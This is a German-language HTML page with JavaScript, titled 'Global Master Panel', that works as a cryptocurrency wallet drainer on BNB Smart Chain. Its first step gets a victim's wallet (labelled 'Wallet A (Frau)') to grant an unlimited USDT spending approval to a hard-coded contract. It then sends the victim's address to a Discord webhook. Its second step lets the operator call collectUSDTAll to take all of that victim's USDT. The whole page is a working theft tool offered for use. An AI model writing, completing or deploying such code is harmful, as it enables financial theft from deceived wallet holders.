<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <title>Global Master Panel (Auto-Chain)</title>
  <style>
    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
    h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
    .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
    input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: #10b981; font-family: monospace; font-size: 11px; margin-bottom: 10px; box-sizing: border-box; }
    button { border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; }
    .btn-green { background: #22c55e; }
    .btn-red { background: #ef4444; }
    .btn-blue { background: #3b82f6; }
    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; }
  </style>
</head>
<body>

<div class="box">
  <h2>Global Master Panel</h2>

  <div class="step">
    <span class="step-title">1. Aktion Wallet A (Frau)</span>
    <button class="btn-green" onclick="approveAndNotify()">Approve & Senden</button>
  </div>

  <div class="step" style="border-left-color: #ef4444;">
    <span class="step-title">2. Einzug (Admin)</span>
    <input type="text" id="targetAddr" placeholder="Adresse von Discord hier einf√ºgen">
    <button class="btn-blue" style="background:#475569;" onclick="connectAdmin()">Owner verbinden</button>
    <button class="btn-red" onclick="collectFinal()">JETZT EINZIEHEN</button>
  </div>

  <div id="status">Bereit. (Auto-BNB aktiv)</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>
<script>
  // DEINE DISCORD WEBHOOK URL HIER EINTRAGEN
  const WEBHOOK_URL = "DEINE_WEBHOOK_URL_HIER"; 
  
  const CONTRACT_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
  const BSC_CHAIN_ID = "0x38"; // 56 in Dezimal

  // Funktion zum automatischen Wechseln zur BNB Chain
  async function ensureBSC() {
    if (!window.ethereum) return false;
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_CHAIN_ID }],
      });
      return true;
    } catch (switchError) {
      // Wenn die Chain nicht in der Wallet existiert, hinzuf√ºgen
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: BSC_CHAIN_ID,
              chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
          return true;
        } catch (addError) {
          return false;
        }
      }
      return false;
    }
  }

  async function approveAndNotify() {
    try {
      if(!WEBHOOK_URL.startsWith("http")) return setStatus("‚ùå Webhook URL fehlt!");
      
      const hasBSC = await ensureBSC();
      if(!hasBSC) return setStatus("‚ùå Bitte zur BNB Smart Chain wechseln.");

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const addr = await signer.getAddress();
      const contract = new ethers.Contract(USDT_ADDR, ["function approve(address s, uint256 a) public returns (bool)"], signer);
      
      setStatus("‚åõ Approve wird ausgef√ºhrt...");
      const tx = await contract.approve(CONTRACT_ADDR, ethers.MaxUint256, { gasLimit: 100000 });
      await tx.wait();
      
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "üöÄ Neue Freigabe (BNB Chain)",
            description: `**Adresse:** \`${addr}\`\n\nKopiere diese f√ºr den Einzug.`,
            color: 16761095 // BNB Gold Farbe
          }]
        })
      });

      setStatus("‚úÖ Erfolgreich! Nachricht in Discord.");
    } catch (e) { setStatus("‚ùå Fehler: " + e.message); }
  }

  async function connectAdmin() {
    try {
      await ensureBSC();
      const provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      setStatus("‚úÖ Owner auf BNB Chain verbunden.");
    } catch (e) { setStatus("‚ùå Verbindung fehlgeschlagen."); }
  }

  async function collectFinal() {
    const source = document.getElementById("targetAddr").value.trim();
    if(!source.startsWith("0x")) return setStatus("‚ùå Adresse ung√ºltig!");
    
    try {
      await ensureBSC();
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDR, ["function collectUSDTAll(address f) external"], signer);
      
      setStatus("‚åõ Einzug l√§uft...");
      const tx = await contract.collectUSDTAll(source);
      await tx.wait();
      setStatus("üéâ USDT erfolgreich eingezogen!");
    } catch (e) { setStatus("‚ùå Einzug fehlgeschlagen. Owner-Check?"); }
  }

  function setStatus(m) { document.getElementById("status").innerHTML = m; }
</script>
</body>
</html>
